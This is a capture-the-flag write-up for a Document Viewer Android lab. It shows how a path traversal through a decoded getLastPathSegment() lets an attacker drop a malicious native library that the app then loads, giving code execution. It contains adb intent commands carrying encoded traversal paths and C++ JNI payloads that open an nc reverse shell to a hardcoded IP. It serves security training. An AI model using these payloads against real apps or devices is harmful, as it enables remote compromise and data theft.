---
title: "MobileHackingLab — Document Viewer RCE"
date: 2025-01-01
category: "mobile"
tags: ["android", "path-traversal", "rce", "native", "ctf"]
summary: "Chaining path traversal in getLastPathSegment() with unverified native library loading for RCE on MobileHackingLab's Document Viewer."
source: "research"
draft: false
---
## Mobile Hacking Lab - Document Viewer

<div style="text-align:center">
    <img src="/images/writeups/ByD9GxfUT.png" alt="Mobile Hacking Lab Document Viewer challenge banner" />
</div>

> :rotating_light: This is a writeup for an active challenge from Mobile Hacking Labs. Try to solve the lab on your own first hosted here: https://www.mobilehackinglab.com/course/lab-document-viewer-rce before peeking.


### Lab Info
In this challenge, we are tasked to exploit a path traversal vulnerability within a "Document Viewer" application then escalate the attack by leveraging a dynamic code loading scenario to perform remote code execution (RCE). 



### Environment Setup
During the challenge, we are given a corellium instance to connect to -- this is where we will be performing the exploit. But of course we want to test it locally so what we can do is to:
1. Download the openvpn configuration, then connect.
2. Follow the instructions to connect to the adb of the device instance
3. Pull the apk then analyze locally.

For static analysis, we can utilize tools such as jadx in order to review the decompiled source code. Then for dynamic analysis we can create our custom frida snippets. 


## Static Analysis
During the initial analysis of an application, what we want to take a look first is on the AndroidManifest file since this xml file defines the components running behind the app which includes stuff such as activities, content providers, receivers, etc.

```xml
<application android:theme="@style/Theme.DocumentViewer" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <activity android:name="com.mobilehackinglab.documentviewer.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/pdf"/>
            </intent-filter>
        </activity>

```

For the manifest file of document-viewer.apk, we can see that it only defines one (1) exported activity which has intent filters set to process deeplinks that open pdf files via http/s or the file:// protocol. We can create our test intents to this activity by performing the following adb command:

```shell
adb shell am start -d "https://pwned.by.avila" -a android.intent.action.VIEW -t "application/pdf"
```

### com.mobilehackinglab.documenviewer.MainActivity.onCreate()
What we want to do next is to review the code on MainActivity, specifically the onCreate method since this serves as the starting point for an activity's lifecycle. 

```java
private final native void initProFeatures();

/* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null);
        setLoadButtonListener();
        handleIntent();
        loadProLibrary();
        if (this.proFeaturesEnabled) {
            initProFeatures();
        }
    }

```

So there are a few things to take note of here. Other than the usual setContentView stuff which inflates the UI and sets some listener stuff for buttons the app calls three methods: `handleIntent`, `loadProLibrary`, and `initProFeatures` in particular order.

### com.mobilehackinglab.documenviewer.MainActivity.handleIntent
![image](/images/writeups/HkB2OyUI6.png)

The code for handleIntent parses if the received intent uses the `android.intent.action.VIEW` action and that the intent data is not empty. If it passes this check, it calls the `copyFileFromUri` method from the `CopyUtil` class then continues with `renderPdf`. Since there's nothing interesting with renderPdf, we will continue with analyzing how the copy logic for the PDF files received is implemented.

### com.mobilehackinglab.documenviewer.CopyUtil.copyFileFromUri

```java
public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
            Intrinsics.checkNotNullParameter(uri, "uri");
            URL url = new URL(uri.toString());
            File file = CopyUtil.DOWNLOADS_DIRECTORY;
            String lastPathSegment = uri.getLastPathSegment();
            if (lastPathSegment == null) {
                lastPathSegment = "download.pdf";
            }
            File outFile = new File(file, lastPathSegment);
            MutableLiveData liveData = new MutableLiveData();
            BuildersKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
            return liveData;
        }

static {
        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        Intrinsics.checkNotNullExpressionValue(externalStoragePublicDirectory, "getExternalStoragePublicDirectory(...)");
        DOWNLOADS_DIRECTORY = externalStoragePublicDirectory;
    }

```

```java
@Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) {
        String str;
        IntrinsicsKt.getCOROUTINE_SUSPENDED();
        switch (this.label) {
            case 0:
                ResultKt.throwOnFailure(obj);
                try {
                    File $this$invokeSuspend_u24lambda_u241 = this.$outFile.getParentFile();
                    if ($this$invokeSuspend_u24lambda_u241 != null) {
                        if (!(!$this$invokeSuspend_u24lambda_u241.exists())) {
                            $this$invokeSuspend_u24lambda_u241 = null;
                        }
                        if ($this$invokeSuspend_u24lambda_u241 != null) {
                            $this$invokeSuspend_u24lambda_u241.mkdirs();
                        }
                    }
                    if (Intrinsics.areEqual(this.$url.getProtocol(), "file")) {
                        InputStream openStream = this.$url.openStream();
                        InputStream inputStream = openStream;
                        FileOutputStream fileOutputStream = new FileOutputStream(this.$outFile);
                        FileOutputStream outputStream = fileOutputStream;
                        Intrinsics.checkNotNull(inputStream);
                        IOStreams.copyTo$default(inputStream, outputStream, 0, 2, null);
                        Closeable.closeFinally(fileOutputStream, null);
                        Closeable.closeFinally(openStream, null);
                    } else {
                        URLConnection openConnection = this.$url.openConnection();
                        Intrinsics.checkNotNull(openConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                        HttpURLConnection connection = (HttpURLConnection) openConnection;
                        connection.connect();
                        BufferedInputStream bufferedInputStream = new BufferedInputStream(connection.getInputStream());
                        BufferedInputStream inputStream2 = bufferedInputStream;
                        FileOutputStream fileOutputStream2 = new FileOutputStream(this.$outFile);
                        FileOutputStream outputStream2 = fileOutputStream2;
                        IOStreams.copyTo$default(inputStream2, outputStream2, 0, 2, null);
                        Closeable.closeFinally(fileOutputStream2, null);
                        Closeable.closeFinally(bufferedInputStream, null);
                        connection.disconnect();
                    }
                    this.$liveData.postValue(Uri.fromFile(this.$outFile));
                } catch (Exception e) {
                    str = CopyUtil.TAG;
                    Log.e(str, "Error copying file from: " + this.$url, e);
                    this.$liveData.postValue(Uri.EMPTY);
                }
                return Unit.INSTANCE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

```
Now this is where it gets interesting. The uri parameter comes from the intent.data that we provide and if we follow the flow we can see that a new file will be created on the Downloads directory (`/storage/emulated/0/Downloads`) then uses the getLastPathSegment() result as the filename. 

This is dangerous since the `getLastPathSegment` method retrieves the *decoded* last segment in the path which means that if we provide a path like `/..%2f..%2f..%2f..%2ftest` it will return `../../../../test` thus highlighting our directory traversal attack path. To demonstrate the behavior, I created a custom frida snippet to monitor when the copyFileFromUri method is called and what file(s) are created then tested it by sending a sample intent with our controlled input data.

#### file-hook.js
```javascript
Java.perform(function(){
    let Companion = Java.use("com.mobilehackinglab.documentviewer.CopyUtil$Companion");
    Companion["copyFileFromUri"].implementation = function (uri) {
    
        console.log(`Companion.copyFileFromUri is called: uri=${uri}`);
        
        var File = Java.use("java.io.File");
        File.$init.overload('java.io.File', 'java.lang.String').implementation = function(filepath, filename) {
            console.log(`Creating new file: ${filepath}${filename}`);
            var ret = this.$init(filepath, filename); 
            return ret;
        };
    
    
        let result = this["copyFileFromUri"](uri);
        console.log(`Companion.copyFileFromUri result=${result}`);
        return result;
    };
});
```

If we review the results from the screenshot below, we can see that our intent data uri triggers a file creation using the following filename: `/storage/emulated/0/Download/../../../../../directory-traversal-baby`. This means that we have the capability to control the filename and the directory to where we will write data.  
![image](/images/writeups/HJhx1xLIp.png)

### com.mobilehackinglab.documentviewer.MainActivity.loadProLibrary
Now that we have confirmed that we have arbitrary file write using the path traversal vulnerability, the question next is what do we want to (over)write. This is where we will need to continue analysis on the `loadProLibrary` method.

```java
private final void loadProLibrary() {
        try {
            String abi = Build.SUPPORTED_ABIS[0];
            File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
            File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
            System.load(libraryFile.getAbsolutePath());
            this.proFeaturesEnabled = true;
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
            this.proFeaturesEnabled = false;
        }
    }
```

So what this method does it it loads an architecture-specific version of the docviewer_pro.so from its directory then proceeds to load the native library via the call to `System.load`. 

> :bug: The attack plan now becomes clear: we need to exploit the **`getLastPathSegment`** path traversal vulnerability in order to write our malicious .so binary into the **`/data/data/com.mobilehackinglab.documentviewer/files/native-libararies/<device-arch>`** directory so that when the app loads the native lib on the call to **`loadProLibrary`** then our payload will get executed thus allowing us to achieve **RCE** on the system.



## building the payload :wrench: 


To serve the files that I'll be needing for my exploit I spun up a quick digital ocean droplet:
![image](/images/writeups/r1ZislL8T.png)

### always (re)validate your findings
First we need to re-confirm that we can write arbitrary files into the document viewer application's private directory (/data/data/com.mobilehackinglab.documentviewer).
```shell
adb shell am start -d "http://164.92.85.153/x/x/x/x/x/%2f..%2f..%2f..%2f..%2f..%2fdata%2fdata%2fcom.mobilehackinglab.documentviewer%2ffiles%2ftest-write" -a android.intent.action.VIEW -t "application/pdf"
```

The adb payload above starts the exported component to load our attacker-controlled intent data then attempts to write the test-write file hosted on our droplet into the vulnerable application's internal directory which as we can see on the result screenshot below has been successful.
![image](/images/writeups/H10yaeL8a.png)

### implementing initProFeatures()
If we take a step back and re-review the onCreate code from the MainActivity, we notice the following block:
```java
if (this.proFeaturesEnabled) {
            initProFeatures();
        }
```

The intended technique was to implement the initProFeatures() method in the native library payload so that it gets called upon succesful loading of the native lib (check the loadProLibrary method code a few paragraphs above) .

```cpp
extern "C" JNIEXPORT void JNICALL Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(JNIEnv *jnienv, jobject instance) {
    system("rm /data/data/com.mobilehackinglab.documentviewer/f;mkfifo /data/data/com.mobilehackinglab.documentviewer/f;cat /data/data/com.mobilehackinglab.documentviewer/f|sh -i 2>&1|nc 164.92.85.153 9337 >/data/data/com.mobilehackinglab.documentviewer/f");
}
```

### cheese strat via JNI_OnLoad :cheese_wedge: 
But ehhh why wait for a specific method to be called when you can just override the [JNI_OnLoad](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad) method which automatically gets called when the native lib is loaded. So I continued to start a new native android studio project and developed the following code to execute our reverse shell payload:

```cpp
JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    if (fork() == 0) {
        system("rm /data/data/com.mobilehackinglab.documentviewer/f;mkfifo /data/data/com.mobilehackinglab.documentviewer/f;cat /data/data/com.mobilehackinglab.documentviewer/f|sh -i 2>&1|nc 164.92.85.153 9337 >/data/data/com.mobilehackinglab.documentviewer/f");
    }
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
```

## launch the payload :bomb: 
*might need to adjust vid quality hehe*

{{< youtube qCIwCIR5rsI >}}
## Resources
- https://hulkvision.github.io/blog/post1/
- https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/